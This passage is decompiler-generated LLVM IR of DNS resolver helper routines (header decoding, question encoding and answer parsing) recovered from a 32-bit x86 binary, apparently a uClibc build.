  %v1_8053cab = add i32 %v0_8053cab, 41
  %v2_8053cab = inttoptr i32 %v1_8053cab to i8*
  %v3_8053cab = load i8, i8* %v2_8053cab, align 1
  %v2_8053caf = load i32, i32* %esi.global-to-local, align 4
  %v3_8053caf = add i32 %v2_8053caf, 8
  %v4_8053caf = inttoptr i32 %v3_8053caf to i8*
  store i8 %v3_8053cab, i8* %v4_8053caf, align 1
  %v0_8053cb2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053cb2 = add i32 %v0_8053cb2, 40
  %v2_8053cb2 = inttoptr i32 %v1_8053cb2 to i32*
  %v3_8053cb2 = load i32, i32* %v2_8053cb2, align 4
  %v1_8053cb5 = trunc i32 %v3_8053cb2 to i8
  %v2_8053cb5 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053cb5 = add i32 %v2_8053cb5, 9
  %v4_8053cb5 = inttoptr i32 %v3_8053cb5 to i8*
  store i8 %v1_8053cb5, i8* %v4_8053cb5, align 1
  %v0_8053cb8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053cb8 = add i32 %v0_8053cb8, 45
  %v2_8053cb8 = inttoptr i32 %v1_8053cb8 to i8*
  %v3_8053cb8 = load i8, i8* %v2_8053cb8, align 1
  %v2_8053cbc = load i32, i32* %esi.global-to-local, align 4
  %v3_8053cbc = add i32 %v2_8053cbc, 10
  %v4_8053cbc = inttoptr i32 %v3_8053cbc to i8*
  store i8 %v3_8053cb8, i8* %v4_8053cbc, align 1
  %v0_8053cbf = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053cbf = add i32 %v0_8053cbf, 44
  %v2_8053cbf = inttoptr i32 %v1_8053cbf to i32*
  %v3_8053cbf = load i32, i32* %v2_8053cbf, align 4
  %v1_8053cc2 = trunc i32 %v3_8053cbf to i8
  %v2_8053cc2 = load i32, i32* %esi.global-to-local, align 4
  %v3_8053cc2 = add i32 %v2_8053cc2, 11
  %v4_8053cc2 = inttoptr i32 %v3_8053cc2 to i8*
  store i8 %v1_8053cc2, i8* %v4_8053cc2, align 1
  %v2_8053cca.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8053cca

dec_label_pc_8053cca:                             ; preds = %entry, %dec_label_pc_8053c34
  %v2_8053cca = phi i32 [ %v0_8053c1d, %entry ], [ %v2_8053cca.pre, %dec_label_pc_8053c34 ]
  %v0_8053ccc = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_8053c34 ]
  store i32 %v2_8053cca, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053ccc

; uselistorder directives
  uselistorder i32 45, { 5, 1, 4, 3, 0, 2 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 3, 1, 0, 2 }
  uselistorder i32 33, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8053cca, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8053cd0 = load i32, i32* @ebx, align 4
  store i32 %v0_8053cd0, i32* %stack_var_-4, align 4
  %v4_8053cd1 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8053cd1, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8053cd9 = load i8, i8* %tmp2, align 1
  %v3_8053cd9 = zext i8 %v2_8053cd9 to i32
  %v1_8053cdc = add i32 %v4_8053cd1, 1
  %v2_8053cdc = inttoptr i32 %v1_8053cdc to i8*
  %v3_8053cdc = load i8, i8* %v2_8053cdc, align 1
  %v4_8053cdc = zext i8 %v3_8053cdc to i32
  %v2_8053ce0 = mul nuw nsw i32 %v3_8053cd9, 256
  %v2_8053ce3 = or i32 %v4_8053cdc, %v2_8053ce0
  %v2_8053ce5 = inttoptr i32 %tmp to i32*
  store i32 %v2_8053ce3, i32* %v2_8053ce5, align 4
  %v0_8053ce7 = load i32, i32* @ecx, align 4
  %v1_8053ce7 = add i32 %v0_8053ce7, 2
  %v2_8053ce7 = inttoptr i32 %v1_8053ce7 to i8*
  %v3_8053ce7 = load i8, i8* %v2_8053ce7, align 1
  %tmp6 = icmp slt i8 %v3_8053ce7, 0
  %v2_8053ceb = zext i1 %tmp6 to i32
  %v1_8053cee = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053cee = add i32 %v1_8053cee, 4
  %v3_8053cee = inttoptr i32 %v2_8053cee to i32*
  store i32 %v2_8053ceb, i32* %v3_8053cee, align 4
  %v0_8053cf1 = load i32, i32* @ecx, align 4
  %v1_8053cf1 = add i32 %v0_8053cf1, 2
  %v2_8053cf1 = inttoptr i32 %v1_8053cf1 to i8*
  %v3_8053cf1 = load i8, i8* %v2_8053cf1, align 1
  %v3_8053cf4 = udiv i8 %v3_8053cf1, 8
  %tmp7 = urem i8 %v3_8053cf4, 16
  %v1_8053cf7 = zext i8 %tmp7 to i32
  %v1_8053cfa = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053cfa = add i32 %v1_8053cfa, 8
  %v3_8053cfa = inttoptr i32 %v2_8053cfa to i32*
  store i32 %v1_8053cf7, i32* %v3_8053cfa, align 4
  %v0_8053cfd = load i32, i32* @ecx, align 4
  %v1_8053cfd = add i32 %v0_8053cfd, 2
  %v2_8053cfd = inttoptr i32 %v1_8053cfd to i8*
  %v3_8053cfd = load i8, i8* %v2_8053cfd, align 1
  %div = udiv i8 %v3_8053cfd, 4
  %tmp8 = urem i8 %div, 2
  %v1_8053d04 = zext i8 %tmp8 to i32
  %v1_8053d07 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053d07 = add i32 %v1_8053d07, 12
  %v3_8053d07 = inttoptr i32 %v2_8053d07 to i32*
  store i32 %v1_8053d04, i32* %v3_8053d07, align 4
  %v0_8053d0a = load i32, i32* @ecx, align 4
  %v1_8053d0a = add i32 %v0_8053d0a, 2
  %v2_8053d0a = inttoptr i32 %v1_8053d0a to i8*
  %v3_8053d0a = load i8, i8* %v2_8053d0a, align 1
  %div5 = udiv i8 %v3_8053d0a, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8053d10 = zext i8 %tmp9 to i32
  %v1_8053d13 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053d13 = add i32 %v1_8053d13, 16
  %v3_8053d13 = inttoptr i32 %v2_8053d13 to i32*
  store i32 %v1_8053d10, i32* %v3_8053d13, align 4
  %v0_8053d16 = load i32, i32* @ecx, align 4
  %v1_8053d16 = add i32 %v0_8053d16, 2
  %v2_8053d16 = inttoptr i32 %v1_8053d16 to i8*
  %v3_8053d16 = load i8, i8* %v2_8053d16, align 1
  %tmp10 = urem i8 %v3_8053d16, 2
  %v1_8053d1a = zext i8 %tmp10 to i32
  %v1_8053d1d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053d1d = add i32 %v1_8053d1d, 20
  %v3_8053d1d = inttoptr i32 %v2_8053d1d to i32*
  store i32 %v1_8053d1a, i32* %v3_8053d1d, align 4
  %v0_8053d20 = load i32, i32* @ecx, align 4
  %v1_8053d20 = add i32 %v0_8053d20, 3
  %v2_8053d20 = inttoptr i32 %v1_8053d20 to i8*
  %v3_8053d20 = load i8, i8* %v2_8053d20, align 1
  %tmp11 = icmp slt i8 %v3_8053d20, 0
  %v2_8053d24 = zext i1 %tmp11 to i32
  %v1_8053d27 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053d27 = add i32 %v1_8053d27, 24
  %v3_8053d27 = inttoptr i32 %v2_8053d27 to i32*
  store i32 %v2_8053d24, i32* %v3_8053d27, align 4
  %v0_8053d2a = load i32, i32* @ecx, align 4
  %v1_8053d2a = add i32 %v0_8053d2a, 3
  %v2_8053d2a = inttoptr i32 %v1_8053d2a to i8*
  %v3_8053d2a = load i8, i8* %v2_8053d2a, align 1
  %tmp12 = urem i8 %v3_8053d2a, 16
  %v1_8053d2e = zext i8 %tmp12 to i32
  %v1_8053d31 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053d31 = add i32 %v1_8053d31, 28
  %v3_8053d31 = inttoptr i32 %v2_8053d31 to i32*
  store i32 %v1_8053d2e, i32* %v3_8053d31, align 4
  %v0_8053d34 = load i32, i32* @ecx, align 4
  %v1_8053d34 = add i32 %v0_8053d34, 4
  %v2_8053d34 = inttoptr i32 %v1_8053d34 to i8*
  %v3_8053d34 = load i8, i8* %v2_8053d34, align 1
  %v4_8053d34 = zext i8 %v3_8053d34 to i32
  %v1_8053d38 = add i32 %v0_8053d34, 5
  %v2_8053d38 = inttoptr i32 %v1_8053d38 to i8*
  %v3_8053d38 = load i8, i8* %v2_8053d38, align 1
  %v4_8053d38 = zext i8 %v3_8053d38 to i32
  %v2_8053d3c = mul nuw nsw i32 %v4_8053d34, 256
  %v2_8053d3f = or i32 %v4_8053d38, %v2_8053d3c
  %v1_8053d41 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053d41 = add i32 %v1_8053d41, 32
  %v3_8053d41 = inttoptr i32 %v2_8053d41 to i32*
  store i32 %v2_8053d3f, i32* %v3_8053d41, align 4
  %v0_8053d44 = load i32, i32* @ecx, align 4
  %v1_8053d44 = add i32 %v0_8053d44, 6
  %v2_8053d44 = inttoptr i32 %v1_8053d44 to i8*
  %v3_8053d44 = load i8, i8* %v2_8053d44, align 1
  %v4_8053d44 = zext i8 %v3_8053d44 to i32
  %v1_8053d48 = add i32 %v0_8053d44, 7
  %v2_8053d48 = inttoptr i32 %v1_8053d48 to i8*
  %v3_8053d48 = load i8, i8* %v2_8053d48, align 1
  %v4_8053d48 = zext i8 %v3_8053d48 to i32
  %v2_8053d4c = mul nuw nsw i32 %v4_8053d44, 256
  %v2_8053d4f = or i32 %v4_8053d48, %v2_8053d4c
  %v1_8053d51 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053d51 = add i32 %v1_8053d51, 36
  %v3_8053d51 = inttoptr i32 %v2_8053d51 to i32*
  store i32 %v2_8053d4f, i32* %v3_8053d51, align 4
  %v0_8053d54 = load i32, i32* @ecx, align 4
  %v1_8053d54 = add i32 %v0_8053d54, 8
  %v2_8053d54 = inttoptr i32 %v1_8053d54 to i8*
  %v3_8053d54 = load i8, i8* %v2_8053d54, align 1
  %v4_8053d54 = zext i8 %v3_8053d54 to i32
  %v1_8053d58 = add i32 %v0_8053d54, 9
  %v2_8053d58 = inttoptr i32 %v1_8053d58 to i8*
  %v3_8053d58 = load i8, i8* %v2_8053d58, align 1
  %v4_8053d58 = zext i8 %v3_8053d58 to i32
  %v2_8053d5c = mul nuw nsw i32 %v4_8053d54, 256
  %v2_8053d5f = or i32 %v4_8053d58, %v2_8053d5c
  %v1_8053d61 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053d61 = add i32 %v1_8053d61, 40
  %v3_8053d61 = inttoptr i32 %v2_8053d61 to i32*
  store i32 %v2_8053d5f, i32* %v3_8053d61, align 4
  %v0_8053d64 = load i32, i32* @ecx, align 4
  %v1_8053d64 = add i32 %v0_8053d64, 10
  %v2_8053d64 = inttoptr i32 %v1_8053d64 to i8*
  %v3_8053d64 = load i8, i8* %v2_8053d64, align 1
  %v4_8053d64 = zext i8 %v3_8053d64 to i32
  %v1_8053d68 = add i32 %v0_8053d64, 11
  %v2_8053d68 = inttoptr i32 %v1_8053d68 to i8*
  %v3_8053d68 = load i8, i8* %v2_8053d68, align 1
  %v4_8053d68 = zext i8 %v3_8053d68 to i32
  %v2_8053d6c = mul nuw nsw i32 %v4_8053d64, 256
  %v2_8053d6f = or i32 %v4_8053d68, %v2_8053d6c
  %v1_8053d71 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053d71 = add i32 %v1_8053d71, 44
  %v3_8053d71 = inttoptr i32 %v2_8053d71 to i32*
  store i32 %v2_8053d6f, i32* %v3_8053d71, align 4
  %v2_8053d79 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053d79, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 13, 14, 4, 5, 9, 10, 15, 7, 2, 11, 12, 0, 6, 3, 8, 1 }
  uselistorder i32 40, { 8, 9, 3, 11, 12, 13, 10, 0, 1, 4, 5, 6, 7, 2 }
  uselistorder i32 7, { 18, 19, 3, 6, 4, 0, 2, 7, 14, 15, 16, 17, 5, 1, 13, 8, 9, 10, 11, 12 }
  uselistorder i32 6, { 25, 26, 2, 3, 21, 22, 0, 6, 18, 14, 15, 8, 28, 16, 23, 24, 4, 1, 5, 7, 12, 13, 17, 20, 9, 19, 10, 11, 27 }
  uselistorder i32 28, { 34, 35, 17, 18, 36, 25, 48, 47, 40, 41, 2, 42, 43, 44, 45, 46, 3, 4, 5, 0, 26, 16, 19, 20, 37, 38, 27, 28, 29, 30, 31, 32, 1, 33, 49, 39, 21, 22, 23, 6, 7, 24, 12, 11, 9, 10, 13, 14, 8, 15 }
  uselistorder i8 2, { 0, 1, 2, 3, 4, 16, 5, 13, 21, 17, 6, 18, 7, 8, 9, 10, 11, 19, 20, 12, 14, 15 }
  uselistorder i8 4, { 0, 3, 1, 4, 5, 2 }
  uselistorder i8 16, { 0, 1, 2, 6, 7, 8, 3, 4, 5 }
  uselistorder i8 8, { 0, 7, 2, 6, 3, 1, 4, 5 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8053d7c = load i32, i32* @edi, align 4
  %v0_8053d7d = load i32, i32* @esi, align 4
  %v0_8053d7e = load i32, i32* @ebx, align 4
  store i32 %v0_8053d7e, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_8053d8b = load i32, i32* @eax, align 4
  %v1_8053d8e = inttoptr i32 %tmp3 to i32*
  %v2_8053d8e = load i32, i32* %v1_8053d8e, align 4
  %v7_8053d90 = inttoptr i32 %v2_8053d8e to i8*
  %v8_8053d90 = call i32 @__encode_dotted(i8* %v7_8053d90, i32 %tmp2, i32 %tmp, i32 %v0_8053d8b, i32 %v0_8053d7e, i32 %v0_8053d7d, i32 %v0_8053d7c)
  store i32 %v8_8053d90, i32* @ecx, align 4
  %v2_8053d9a = icmp slt i32 %v8_8053d90, 0
  br i1 %v2_8053d9a, label %dec_label_pc_8053dc9, label %dec_label_pc_8053d9e

dec_label_pc_8053d9e:                             ; preds = %entry
  %v0_8053d9e = load i32, i32* @ebx, align 4
  %v2_8053d9e = sub i32 %v0_8053d9e, %v8_8053d90
  %v1_8053da0 = add i32 %v2_8053d9e, -3
  %v6_8053da0 = sub i32 2, %v2_8053d9e
  %v7_8053da0 = and i32 %v6_8053da0, %v2_8053d9e
  %v8_8053da0 = icmp slt i32 %v7_8053da0, 0
  %v9_8053da0 = icmp eq i32 %v1_8053da0, 0
  %v10_8053da0 = icmp slt i32 %v1_8053da0, 0
  %v3_8053da3 = icmp eq i1 %v10_8053da0, %v8_8053da0
  %v4_8053da3 = icmp eq i1 %v9_8053da0, false
  %v5_8053da3 = and i1 %v4_8053da3, %v3_8053da3
  br i1 %v5_8053da3, label %dec_label_pc_8053daa, label %dec_label_pc_8053da5

dec_label_pc_8053da5:                             ; preds = %dec_label_pc_8053d9e
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8053dc9

dec_label_pc_8053daa:                             ; preds = %dec_label_pc_8053d9e
  %v0_8053daa = load i32, i32* @edi, align 4
  %v2_8053daa = add i32 %v0_8053daa, %v8_8053d90
  store i32 %v2_8053daa, i32* @edx, align 4
  %v1_8053dad = add i32 %v8_8053d90, 4
  store i32 %v1_8053dad, i32* @ecx, align 4
  %v0_8053db0 = load i32, i32* @esi, align 4
  %v1_8053db0 = add i32 %v0_8053db0, 5
  %v2_8053db0 = inttoptr i32 %v1_8053db0 to i8*
  %v3_8053db0 = load i8, i8* %v2_8053db0, align 1
  %v3_8053db4 = inttoptr i32 %v2_8053daa to i8*
  store i8 %v3_8053db0, i8* %v3_8053db4, align 1
  %v0_8053db6 = load i32, i32* @esi, align 4
  %v1_8053db6 = add i32 %v0_8053db6, 4
  %v2_8053db6 = inttoptr i32 %v1_8053db6 to i32*
  %v3_8053db6 = load i32, i32* %v2_8053db6, align 4
  %v1_8053db9 = trunc i32 %v3_8053db6 to i8
  %v2_8053db9 = load i32, i32* @edx, align 4
  %v3_8053db9 = add i32 %v2_8053db9, 1
  %v4_8053db9 = inttoptr i32 %v3_8053db9 to i8*
  store i8 %v1_8053db9, i8* %v4_8053db9, align 1
  %v0_8053dbc = load i32, i32* @esi, align 4
  %v1_8053dbc = add i32 %v0_8053dbc, 9
  %v2_8053dbc = inttoptr i32 %v1_8053dbc to i8*
  %v3_8053dbc = load i8, i8* %v2_8053dbc, align 1
  %v2_8053dc0 = load i32, i32* @edx, align 4
  %v3_8053dc0 = add i32 %v2_8053dc0, 2
  %v4_8053dc0 = inttoptr i32 %v3_8053dc0 to i8*
  store i8 %v3_8053dbc, i8* %v4_8053dc0, align 1
  %v0_8053dc3 = load i32, i32* @esi, align 4
  %v1_8053dc3 = add i32 %v0_8053dc3, 8
  %v2_8053dc3 = inttoptr i32 %v1_8053dc3 to i32*
  %v3_8053dc3 = load i32, i32* %v2_8053dc3, align 4
  %v1_8053dc6 = trunc i32 %v3_8053dc3 to i8
  %v2_8053dc6 = load i32, i32* @edx, align 4
  %v3_8053dc6 = add i32 %v2_8053dc6, 3
  %v4_8053dc6 = inttoptr i32 %v3_8053dc6 to i8*
  store i8 %v1_8053dc6, i8* %v4_8053dc6, align 1
  %v0_8053dc9.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8053dc9

dec_label_pc_8053dc9:                             ; preds = %entry, %dec_label_pc_8053da5, %dec_label_pc_8053daa
  %v0_8053dc9 = phi i32 [ %v8_8053d90, %entry ], [ -1, %dec_label_pc_8053da5 ], [ %v0_8053dc9.pre, %dec_label_pc_8053daa ]
  %v2_8053dcb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053dcb, i32* @ebx, align 4
  store i32 %v0_8053d7c, i32* @edi, align 4
  ret i32 %v0_8053dc9

; uselistorder directives
  uselistorder i32 %v1_8053da0, { 1, 0 }
  uselistorder i32 %v2_8053d9e, { 0, 2, 1 }
  uselistorder i32 %v8_8053d90, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 6, 4, 0, 5 }
  uselistorder label %dec_label_pc_8053dc9, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v2_8053ddb = call i32 @__length_dotted(i32 %tmp, i32 %tmp2)
  %v2_8053de3 = icmp slt i32 %v2_8053ddb, 0
  br i1 %v2_8053de3, label %dec_label_pc_8053dea, label %dec_label_pc_8053de7

dec_label_pc_8053de7:                             ; preds = %entry
  %v1_8053de7 = add i32 %v2_8053ddb, 4
  br label %dec_label_pc_8053dea

dec_label_pc_8053dea:                             ; preds = %entry, %dec_label_pc_8053de7
  %v0_8053ded = phi i32 [ %v2_8053ddb, %entry ], [ %v1_8053de7, %dec_label_pc_8053de7 ]
  ret i32 %v0_8053ded

; uselistorder directives
  uselistorder label %dec_label_pc_8053dea, { 1, 0 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8053df0 = load i32, i32* @ebp, align 4
  %v0_8053df1 = load i32, i32* @edi, align 4
  %v0_8053df2 = load i32, i32* @esi, align 4
  %v0_8053df3 = load i32, i32* @ebx, align 4
  store i32 %v0_8053df3, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8053e14 = ptrtoint i32* %stack_var_-272 to i32
  %v4_8053e21 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_8053e14, i32 256)
  store i32 %v4_8053e21, i32* @edi, align 4
  %v3_8053e2b = icmp slt i32 %v4_8053e21, 0
  br i1 %v3_8053e2b, label %dec_label_pc_8053edc, label %dec_label_pc_8053e33

dec_label_pc_8053e33:                             ; preds = %entry
  %v0_8053e33 = load i32, i32* @ebx, align 4
  %v3_8053e33 = add i32 %v0_8053e33, %v4_8053e21
  %v0_8053e35 = load i32, i32* @esi, align 4
  %v2_8053e35 = sub i32 %v0_8053e35, %v3_8053e33
  %v1_8053e3b = add i32 %v2_8053e35, -10
  %v10_8053e3b = icmp slt i32 %v1_8053e3b, 0
  store i32 %v1_8053e3b, i32* @esi, align 4
  %v1_8053e42 = icmp eq i1 %v10_8053e3b, false
  br i1 %v1_8053e42, label %dec_label_pc_8053e4b, label %dec_label_pc_8053e44

dec_label_pc_8053e44:                             ; preds = %dec_label_pc_8053e33
  br label %dec_label_pc_8053edc

dec_label_pc_8053e4b:                             ; preds = %dec_label_pc_8053e33
  %v6_8053e52 = add i32 %v3_8053e33, %tmp4
  store i32 %v6_8053e52, i32* @ebx, align 4
  %v1_8053e5e = bitcast i32* %stack_var_-272 to i8*
  %v2_8053e5e = call i32 @__GI_strdup(i8* %v1_8053e5e)
  %v1_8053e63 = load i32, i32* @ebp, align 4
  %v2_8053e63 = inttoptr i32 %v1_8053e63 to i32*
  store i32 %v2_8053e5e, i32* %v2_8053e63, align 4
  %v0_8053e66 = load i32, i32* @ebx, align 4
  %v1_8053e66 = add i32 %v0_8053e66, 4
  store i32 %v1_8053e66, i32* %esi.global-to-local, align 4
  %v1_8053e69 = inttoptr i32 %v0_8053e66 to i8*
  %v2_8053e69 = load i8, i8* %v1_8053e69, align 1
  %v3_8053e69 = zext i8 %v2_8053e69 to i32
  %v1_8053e6c = add i32 %v0_8053e66, 1
  %v2_8053e6c = inttoptr i32 %v1_8053e6c to i8*
  %v3_8053e6c = load i8, i8* %v2_8053e6c, align 1
  %v4_8053e6c = zext i8 %v3_8053e6c to i32
  %v2_8053e70 = mul nuw nsw i32 %v3_8053e69, 256
  %v2_8053e73 = or i32 %v4_8053e6c, %v2_8053e70
  %v1_8053e75 = load i32, i32* @ebp, align 4
  %v2_8053e75 = add i32 %v1_8053e75, 4
  %v3_8053e75 = inttoptr i32 %v2_8053e75 to i32*
  store i32 %v2_8053e73, i32* %v3_8053e75, align 4
  %v0_8053e78 = load i32, i32* @ebx, align 4
  %v1_8053e78 = add i32 %v0_8053e78, 2
  %v2_8053e78 = inttoptr i32 %v1_8053e78 to i8*
  %v3_8053e78 = load i8, i8* %v2_8053e78, align 1
  %v4_8053e78 = zext i8 %v3_8053e78 to i32
  %v1_8053e7c = add i32 %v0_8053e78, 3
  %v2_8053e7c = inttoptr i32 %v1_8053e7c to i8*
  %v3_8053e7c = load i8, i8* %v2_8053e7c, align 1
  %v4_8053e7c = zext i8 %v3_8053e7c to i32
  %v2_8053e80 = mul nuw nsw i32 %v4_8053e78, 256
  %v2_8053e83 = or i32 %v4_8053e7c, %v2_8053e80
  %v1_8053e85 = load i32, i32* @ebp, align 4
  %v2_8053e85 = add i32 %v1_8053e85, 8
  %v3_8053e85 = inttoptr i32 %v2_8053e85 to i32*
  store i32 %v2_8053e83, i32* %v3_8053e85, align 4
  %v0_8053e88 = load i32, i32* @ebx, align 4
  %v1_8053e88 = add i32 %v0_8053e88, 4
  %v2_8053e88 = inttoptr i32 %v1_8053e88 to i8*
  %v3_8053e88 = load i8, i8* %v2_8053e88, align 1
  %v4_8053e88 = zext i8 %v3_8053e88 to i32
  %v0_8053e8c = load i32, i32* %esi.global-to-local, align 4
  %v1_8053e8c = add i32 %v0_8053e8c, 1
  %v2_8053e8c = inttoptr i32 %v1_8053e8c to i8*
  %v3_8053e8c = load i8, i8* %v2_8053e8c, align 1
  %v4_8053e8c = zext i8 %v3_8053e8c to i32
  %v2_8053e90 = mul nuw i32 %v4_8053e88, 16777216
  %v2_8053e93 = mul nuw nsw i32 %v4_8053e8c, 65536
  %v1_8053e96 = add i32 %v0_8053e8c, 2
  %v2_8053e96 = inttoptr i32 %v1_8053e96 to i8*
  %v3_8053e96 = load i8, i8* %v2_8053e96, align 1
  %v4_8053e96 = zext i8 %v3_8053e96 to i32
  %v2_8053e9a = mul nuw nsw i32 %v4_8053e96, 256
  %v2_8053e9d = or i32 %v2_8053e93, %v2_8053e90
  %v1_8053e9f = add i32 %v0_8053e8c, 3
  %v2_8053e9f = inttoptr i32 %v1_8053e9f to i8*
  %v3_8053e9f = load i8, i8* %v2_8053e9f, align 1
  %v4_8053e9f = zext i8 %v3_8053e9f to i32
  %v2_8053ea3 = or i32 %v4_8053e9f, %v2_8053e9d
  %v2_8053ea5 = or i32 %v2_8053ea3, %v2_8053e9a
  store i32 %v2_8053ea5, i32* @ecx, align 4
  %v1_8053ea7 = load i32, i32* @ebp, align 4
  %v2_8053ea7 = add i32 %v1_8053ea7, 12
  %v3_8053ea7 = inttoptr i32 %v2_8053ea7 to i32*
  store i32 %v2_8053ea5, i32* %v3_8053ea7, align 4
  %v0_8053eaa = load i32, i32* @ebx, align 4
  %v1_8053eaa = add i32 %v0_8053eaa, 8
  %v2_8053eaa = inttoptr i32 %v1_8053eaa to i8*
  %v3_8053eaa = load i8, i8* %v2_8053eaa, align 1
  %v4_8053eaa = zext i8 %v3_8053eaa to i32
  %v1_8053eae = add i32 %v0_8053eaa, 9
  %v2_8053eae = inttoptr i32 %v1_8053eae to i8*
  %v3_8053eae = load i8, i8* %v2_8053eae, align 1
  %v4_8053eae = zext i8 %v3_8053eae to i32
  %v2_8053eb2 = mul nuw nsw i32 %v4_8053eaa, 256
  %v1_8053eb5 = add i32 %v0_8053eaa, 10
  %v2_8053eb8 = or i32 %v4_8053eae, %v2_8053eb2
  store i32 %v2_8053eb8, i32* @edx, align 4
  %v1_8053eba = load i32, i32* @ebp, align 4
  %v2_8053eba = add i32 %v1_8053eba, 20
  %v3_8053eba = inttoptr i32 %v2_8053eba to i32*
  store i32 %v1_8053eb5, i32* %v3_8053eba, align 4
  %v0_8053ebd = load i32, i32* @edx, align 4
  %v1_8053ebd = load i32, i32* @ebp, align 4
  %v2_8053ebd = add i32 %v1_8053ebd, 16
  %v3_8053ebd = inttoptr i32 %v2_8053ebd to i32*
  store i32 %v0_8053ebd, i32* %v3_8053ebd, align 4
  %v1_8053ec7 = add i32 %v3_8053e33, 10
  %v1_8053eca = load i32, i32* @ebp, align 4
  %v2_8053eca = add i32 %v1_8053eca, 24
  %v3_8053eca = inttoptr i32 %v2_8053eca to i32*
  store i32 %v1_8053ec7, i32* %v3_8053eca, align 4
  %v4_8053ecd = load i32, i32* @edx, align 4
  %v5_8053ed1 = icmp slt i32 %v1_8053e3b, %v4_8053ecd
  br i1 %v5_8053ed1, label %dec_label_pc_8053ed3, label %dec_label_pc_8053ed8

dec_label_pc_8053ed3:                             ; preds = %dec_label_pc_8053e4b
  br label %dec_label_pc_8053edc

dec_label_pc_8053ed8:                             ; preds = %dec_label_pc_8053e4b
  %v1_8053ed8 = load i32, i32* @edi, align 4
  %v2_8053ed8 = add i32 %v4_8053ecd, 10
  %v3_8053ed8 = add i32 %v2_8053ed8, %v1_8053ed8
  br label %dec_label_pc_8053edc

dec_label_pc_8053edc:                             ; preds = %entry, %dec_label_pc_8053ed3, %dec_label_pc_8053e44, %dec_label_pc_8053ed8
  %v0_8053ee2 = phi i32 [ %v4_8053e21, %entry ], [ -1, %dec_label_pc_8053ed3 ], [ %v1_8053e3b, %dec_label_pc_8053e44 ], [ %v3_8053ed8, %dec_label_pc_8053ed8 ]
  %v2_8053ee4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053ee4, i32* @ebx, align 4
  store i32 %v0_8053df2, i32* @esi, align 4
  store i32 %v0_8053df1, i32* @edi, align 4
  store i32 %v0_8053df0, i32* @ebp, align 4
  ret i32 %v0_8053ee2

; uselistorder directives
  uselistorder i32 %v1_8053e3b, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8053e33, { 1, 0, 2 }
  uselistorder i32 %v4_8053e21, { 1, 0, 2, 3 }
  uselistorder i32 24, { 29, 30, 19, 0, 31, 32, 33, 20, 5, 10, 36, 11, 12, 13, 34, 21, 22, 23, 24, 25, 26, 27, 38, 2, 35, 14, 15, 16, 17, 18, 3, 4, 6, 7, 8, 1, 9, 28, 37 }
  uselistorder i32 20, { 34, 35, 36, 37, 5, 23, 41, 8, 42, 38, 39, 6, 24, 25, 4, 11, 12, 33, 13, 14, 15, 26, 27, 28, 0, 29, 1, 30, 9, 31, 32, 44, 40, 7, 16, 17, 18, 19, 20, 21, 22, 3, 2, 43, 10 }
  uselistorder i32 9, { 16, 17, 18, 19, 7, 20, 10, 11, 4, 9, 3, 8, 12, 13, 14, 15, 6, 5, 1, 0, 21, 22, 2 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 10, 9 }
  uselistorder i32 3, { 46, 47, 48, 49, 50, 51, 25, 3, 26, 15, 45, 7, 52, 27, 9, 8, 4, 1, 2, 0, 28, 5, 29, 38, 16, 39, 33, 53, 17, 18, 34, 30, 14, 11, 12, 10, 13, 32, 44, 31, 35, 19, 36, 20, 37, 40, 41, 42, 43, 21, 22, 23, 24, 6 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
